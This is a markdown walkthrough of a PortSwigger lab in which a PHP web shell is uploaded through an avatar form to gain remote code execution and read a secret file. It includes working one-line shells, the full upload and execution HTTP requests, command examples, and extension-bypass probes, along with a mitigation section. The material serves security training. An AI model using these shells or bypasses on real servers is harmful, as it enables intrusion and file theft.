# 📘 PortSwigger Lab: Remote code execution via web shell upload

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell  
> 🎯 Topic: Unrestricted File Upload — uploading a web shell for RCE  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🐚 What Is a Web Shell](#webshell)
- [⚡ The Exploit Payload](#exploit)
- [🔍 Step 1 — Recon the Upload Function](#step1)
- [🔍 Step 2 — Upload the PHP Shell](#step2)
- [🔍 Step 3 — Determine the Uploaded File Path](#step3)
- [🔍 Step 4 — Execute the Shell and Retrieve the Secret](#step4)
- [📨 Example Payload](#examples)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Exploit the unrestricted file upload vulnerability to:

```text
1. Upload a PHP web shell to the server via the avatar upload function.
2. Determine the path where uploaded files are saved.
3. Execute arbitrary code on the server through the web shell.
4. Read the contents of /home/carlos/secret and submit it as the solution.
```

---

<a id="theory"></a>

## 🧠 Short Theory

File upload is one of the most dangerous features of web applications. If the server stores a user-supplied file and then **executes/interprets** it as code, the upload becomes **remote code execution (RCE)**.

Typical scenario: the site allows avatar uploads (images) but does not validate the **content type** of the file. The attacker uploads a script (e.g., PHP) with a `.php` extension and then requests it by URL — the server executes it as code.

A web shell is a minimal script that takes a command from the request and executes it on the server:

```php
<?php echo system($_GET['cmd']); ?>
```

One line of code uploaded to the server — and the attacker gets a "terminal" through a URL parameter.

---

<a id="idea"></a>

## 🧩 Core Idea

The avatar upload function does not validate the file's content or extension:

```text
Upload:   avatar.php (PHP shell)     → stored as-is ✅
Access:   /files/avatars/avatar.php   → server executes PHP ✅
Result:   RCE via ?cmd=
```

The chain:

```text
Upload the shell → find the file path → GET /files/avatars/avatar.php?cmd=...
```

---

<a id="webshell"></a>

## 🐚 What Is a Web Shell

A web shell is a script that receives a command via an HTTP request and executes it through a system call:

```text
Request:   GET /files/avatars/shell.php?cmd=whoami
Server:    system("whoami")
Response:  carlos (or the web server user)
```

The equivalent of RCE: the attacker does not need shell access (SSH/RDP) — plain HTTP is enough.

Common interpreters and their extensions:

```text
PHP      → .php
Java     → .jsp
ASP.NET  → .aspx
Python   → not directly executable (needs CGI/WSGI)
```

In this lab the server runs PHP.

---

<a id="exploit"></a>

## ⚡ The Exploit Payload

PHP shell saved as `avatar.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

A variant supporting arbitrary commands (more universal for research):

```php
<?php echo system($_GET['cmd']); ?>
```

Both work; the first one is enough to solve the lab — it directly reads the target file.

---

<a id="step1"></a>

## 🔍 Step 1 — Recon the Upload Function

1. Log in as the test user (e.g., `wiener:peter`).
2. Go to the account page — there is an avatar upload form.
3. Upload a normal image and **inspect the traffic in Burp**:

```text
POST /my-account/avatar
Content-Type: multipart/form-data

POST parameter avatar: file
```

4. Note how the uploaded file is served afterwards:

```text
<img src="/files/avatars/avatar.png">
```

The path `/files/avatars/` is the key to exploitation: files are stored in a web-accessible directory.

---

<a id="step2"></a>

## 🔍 Step 2 — Upload the PHP Shell

1. Create a local file `avatar.php` with the content:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Upload it via the avatar form.

3. Read the server response. Success indicator:

```text
The file avatars/avatar.php has been uploaded.
```

The server **does not validate** the file type — the PHP script is stored as an "avatar". Unrestricted file upload confirmed.

---

<a id="step3"></a>

## 🔍 Step 3 — Determine the Uploaded File Path

Assemble the file URL from the upload response and the account page HTML:

```text
Response: The file avatars/avatar.php has been uploaded.
Page:     <img src="/files/avatars/avatar.png">
```

Final shell URL:

```text
/files/avatars/avatar.php
```

---

<a id="step4"></a>

## 🔍 Step 4 — Execute the Shell and Retrieve the Secret

Send a GET request to the shell (in Burp or a browser):

```text
GET /files/avatars/avatar.php
```

The server executes the PHP and the response contains the file contents:

```text
The secret string from /home/carlos/secret
```

Submit the contents as the lab solution.

The lab is marked:

```text
Solved
```

---

<a id="examples"></a>

## 📨 Example Payload

### File to upload (avatar.php)

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Upload request

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename="avatar.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

### Request to the shell

```http
GET /files/avatars/avatar.php HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

---

<a id="response"></a>

## 📥 Example Result

### Upload response

```text
The file avatars/avatar.php has been uploaded.
```

### Shell response

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

SECRET-VALUE-HERE
```

Lab status:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in and locate the avatar upload function
2. Upload a test image, inspect the traffic and the file path (/files/avatars/)
3. Create a PHP shell that reads /home/carlos/secret
4. Upload avatar.php via the form — the server accepts it without validation
5. Request /files/avatars/avatar.php
6. The server executes the PHP; the response contains the secret
7. Submit the secret — the lab is Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. No File Type Validation

The server accepts any file, including `.php`. No extension, MIME, or content checks exist.

### 2. Files Are Stored in a Web-Accessible Directory

`/files/avatars/` is reachable over HTTP — the uploaded script can be requested directly by URL.

### 3. The Server Executes the Uploaded Code

The PHP interpreter processes `.php` files in the upload directory. The file's content becomes executed code.

### 4. Uploaded Code Runs with Web Server Privileges

The shell reads `/home/carlos/secret` — a file outside the web root. This is full RCE, not just a defacement.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

After finding an upload function, immediately answer three questions:

```text
1. Where is the file stored?  (web-accessible directory?)
2. What happens to the file afterwards?  (executed? served as static?)
3. Which checks can be bypassed?  (extension? MIME? content?)
```

Probes to determine the validation mode:

```text
shell.php            → basic test
shell.php.jpg        → double extension
shell.jpg.php        → extension at the end
SHELL.PHP            → case variation
shell.phtml          → alternative PHP extension
GIF89a + PHP code    → magic bytes at the start
```

The executability indicator: a GET request to the uploaded file returns the script's output, not its source code.

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, the following can be compared:

### Command-executing shell

```php
<?php echo system($_GET['cmd']); ?>
```

```text
GET /files/avatars/avatar.php?cmd=whoami
GET /files/avatars/avatar.php?cmd=ls+/home/carlos
```

### Different extensions (if validation existed)

```text
avatar.phtml
avatar.php5
avatar.PHP
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Missing the File Path

The path `/files/avatars/` is visible in the account page HTML and the upload response. Without it, the shell cannot be invoked.

### Mistake 2. Uploading the Shell but Not Opening It

The upload alone does nothing — you must send a GET request to the file so the server executes it.

### Mistake 3. PHP Syntax Error

A missing `<?php` or `?>`, an extra semicolon — the file will be stored but will not execute or will return an error.

### Mistake 4. Wrong Path to the Target File

`/home/carlos/secret` is the absolute path from the lab description. A typo in the path = an empty response.

### Mistake 5. Reading the "Source" Instead of Executing

If the server serves the shell's source code instead of executing it — that is a different serving/validation mode, and another execution point must be found.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Extension and MIME Validation

Validate the extension against a strict whitelist (`jpg`, `jpeg`, `png`, `webp`) and check `Content-Type` — but never trust the header alone.

### 2. Content Validation

Validate magic bytes / reopen the image through an image-processing library (image reprocessing) — this strips embedded payloads.

### 3. Random File Names

Generate the name server-side (UUID) and do not store the user-supplied one — this makes the path unpredictable.

### 4. Store Outside the Web Root

Save uploads in a directory unreachable over HTTP and serve them through a dedicated endpoint/proxy.

### 5. Do Not Execute Code in the Upload Directory

Disable script handling in the upload directory (nginx: `location /files/ { deny all; }` or serve as static).

### 6. Least Privilege for the Process

The web server must run with minimal privileges — so compromised code cannot read arbitrary files.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Logged in as the test user
- [ ] Located the avatar upload form
- [ ] Determined the storage path (`/files/avatars/`)
- [ ] Inspected the multipart upload request

### Exploitation

- [ ] Created the PHP shell (`<?php echo file_get_contents('/home/carlos/secret'); ?>`)
- [ ] Uploaded `avatar.php` without being blocked
- [ ] Received the upload confirmation (`avatars/avatar.php`)
- [ ] Sent a GET request to `/files/avatars/avatar.php`
- [ ] Retrieved the secret from the response
- [ ] Submitted the secret — status Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved through a classic **upload-to-RCE** scenario:

```text
1. Lack of validation → a PHP shell uploaded as an "avatar"
2. The shell stored in a web-accessible directory
3. A request to the file → the server executed the PHP
4. /home/carlos/secret read → RCE confirmed
```

Main lessons:

```text
A file upload becomes RCE when the file is stored in an executable web directory.
```

```text
Checking only the extension/type is insufficient — validate content and storage location.
```

```text
A one-line PHP web shell gives the attacker a terminal over HTTP.
```

```text
Mitigation: type whitelist, content validation, storage outside the web root, execution ban.
```

---

[⬆ Back to top](#top)
